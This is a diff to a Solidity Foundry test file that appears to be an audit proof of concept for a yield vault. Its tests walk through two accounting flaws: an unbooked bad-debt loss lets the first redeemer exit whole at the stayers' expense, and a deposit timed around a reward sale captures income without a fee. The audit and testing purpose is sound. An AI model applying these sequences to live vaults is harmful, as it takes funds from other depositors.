@@ -1,94 +1,59 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.30;
 
-import {Test} from "forge-std/Test.sol";
-import {SluiceVault} from "../src/SluiceVault.sol";
-import {LendingMarketStrategy} from "../src/strategies/LendingMarketStrategy.sol";
-import {IERC4626} from "../src/interfaces/IERC4626.sol";
-import {MockERC20} from "./mocks/MockERC20.sol";
-import {MockLendingMarket} from "./mocks/MockLendingMarket.sol";
+import {SluiceFixture} from "./SluiceFixture.sol";
 
 /// Copy into the audited project's test/ folder and run: forge test --match-contract ProofTest
-contract ProofTest is Test {
-    address internal owner = makeAddr("owner");
-    address internal allocator = makeAddr("allocator");
-    address internal treasury = makeAddr("treasury");
-    address internal alice = makeAddr("alice");
-    address internal bob = makeAddr("bob");
-
-    MockERC20 internal usdc;
-    MockLendingMarket internal market;
-    SluiceVault internal vault;
-    LendingMarketStrategy internal strategy;
-
-    function setUp() public {
-        usdc = new MockERC20("USD Coin", "USDC", 6);
-        market = new MockLendingMarket(usdc);
-        vault = new SluiceVault(usdc, "Sluice USDC", "slUSDC", owner, treasury, 0, 1_500, 0);
-        strategy = new LendingMarketStrategy(address(vault), IERC4626(address(market)));
-        vm.startPrank(owner);
-        vault.setIsAllocator(allocator, true);
-        vault.submitStrategy(strategy, type(uint256).max);
-        vault.acceptStrategy(strategy);
-        vm.stopPrank();
-        for (uint256 i; i < 2; ++i) {
-            address account = i == 0 ? alice : bob;
-            usdc.mint(account, 1_000_000e6);
-            vm.prank(account);
-            usdc.approve(address(vault), type(uint256).max);
-        }
-    }
-
-    /// High 1: a withdrawal that pulls from a strategy lowers its assets but not `deployedAssets`,
-    /// so the next harvest reads the withdrawal as a loss and the treasury's fee on real profit is lost.
-    function test_withdrawalErasesPerformanceFee() public {
-        vm.prank(alice);
-        vault.deposit(1_000_000e6, alice);
+contract ProofTest is SluiceFixture {
+    /// Known vulnerability 1: the vault prices shares from each strategy's booked value, while a
+    /// withdrawal takes live assets out of the market and lowers the booked value one for one. After a
+    /// market writes off bad debt and before the next harvest, the first holder out is paid in full and
+    /// the whole loss lands on the holders who stay.
+    function test_unbookedLossEscapesToStayers() public {
+        uint256 aliceShares = _deposit(alice, 500_000e6);
+        uint256 bobShares = _deposit(bob, 500_000e6);
         vm.prank(allocator);
-        vault.allocate(strategy, 1_000_000e6);
-
-        market.accrueInterest(50_000e6); // 50,000 USDC of real profit, 7,500 owed to the treasury
-
-        vm.prank(alice);
-        vault.withdraw(200_000e6, alice, alice); // idle is empty, so this undeploys from the strategy
-        assertEq(strategy.deployedAssets(), 1_000_000e6, "baseline still counts the withdrawn 200,000");
-
+        vault.allocate(strategyA, 1_000_000e6);
         vm.prank(allocator);
-        vault.harvest(strategy);
+        vault.harvest(strategyA);
 
-        assertEq(vault.accruedFees(), 0, "no fee booked on 50,000 of profit");
-        assertApproxEqAbs(strategy.deployedAssets(), 850_000e6, 1, "profit absorbed into the new baseline");
-    }
-
-    /// High 2: fees booked at harvest stay in the vault's balance and `totalAssets` still counts them,
-    /// so a depositor who redeems before `claimFees` takes part of the fee, and the claim then comes
-    /// out of the depositors who stayed.
-    function test_unclaimedFeesInflateSharePrice() public {
-        vm.prank(alice);
-        uint256 aliceShares = vault.deposit(500_000e6, alice);
-        vm.prank(bob);
-        uint256 bobShares = vault.deposit(500_000e6, bob);
-        vm.prank(allocator);
-        vault.allocate(strategy, 1_000_000e6);
-
-        market.accrueInterest(100_000e6);
-        vm.prank(allocator);
-        vault.harvest(strategy);
-        uint256 fee = vault.accruedFees();
-        assertApproxEqAbs(fee, 15_000e6, 1);
-
-        // Each holder's fair share: half of (1,100,000 - 15,000 fee) = 542,500.
-        uint256 fair = 542_500e6;
-        assertApproxEqAbs(vault.totalAssets(), 1_100_000e6, 2, "fee owed to treasury still counted");
+        marketA.borrow(400_000e6);
+        marketA.writeOff(100_000e6); // the market loses 100,000 of the vault's 1,000,000
+        assertApproxEqAbs(strategyA.totalAssets(), 900_000e6, 1);
+        assertEq(vault.totalAssets(), 1_000_000e6, "share price still at the booked value");
 
         vm.prank(alice);
         uint256 aliceOut = vault.redeem(aliceShares, alice, alice);
-        assertGt(aliceOut, fair + 7_000e6, "alice exits with about 550,000");
+        assertApproxEqAbs(aliceOut, 500_000e6, 1, "alice leaves with no part of the loss");
 
-        vault.claimFees();
-        assertApproxEqAbs(usdc.balanceOf(treasury), 15_000e6, 1);
-
+        vm.prank(allocator);
+        vault.harvest(strategyA);
         uint256 bobValue = vault.previewRedeem(bobShares);
-        assertLt(bobValue, fair - 7_000e6, "bob is left with about 535,000");
+        // Fair split of the loss: 450,000 each. Bob carries all of it.
+        assertApproxEqAbs(bobValue, 400_000e6, 2, "bob is left with 400,000");
+    }
+
+    /// Known vulnerability 2: harvest charges the performance fee and unlocks profit over two days,
+    /// but sold rewards land in the vault's idle balance, which totalAssets counts at once. The
+    /// treasury gets no fee on reward income, and a deposit placed just before `sellRewards` and
+    /// redeemed just after takes a share of income the existing holders earned.
+    function test_soldRewardsSkipFeeAndUnlock() public {
+        _deposit(alice, 1_000_000e6);
+        vm.prank(allocator);
+        vault.allocate(strategyB, 1_000_000e6);
+        rewards.setOwed(address(strategyB), address(rewardToken), 10_000e18); // worth 20,000 USDC
+
+        uint256 bobShares = _deposit(bob, 1_000_000e6); // lands just before the allocator's sale
+        uint256 before = vault.totalAssets();
+        vm.prank(allocator);
+        vault.sellRewards(strategyB, address(rewardToken), 20_000e6);
+
+        assertEq(vault.totalAssets(), before + 20_000e6, "all 20,000 reaches the share price at once");
+        assertEq(vault.accruedFees(), 0, "no fee on 20,000 of income");
+        assertEq(vault.unlockingProfit(), 0, "nothing unlocking");
+
+        vm.prank(bob);
+        uint256 bobOut = vault.redeem(bobShares, bob, bob);
+        assertGt(bobOut, 1_009_999e6, "bob takes half the rewards in one block");
     }
 }
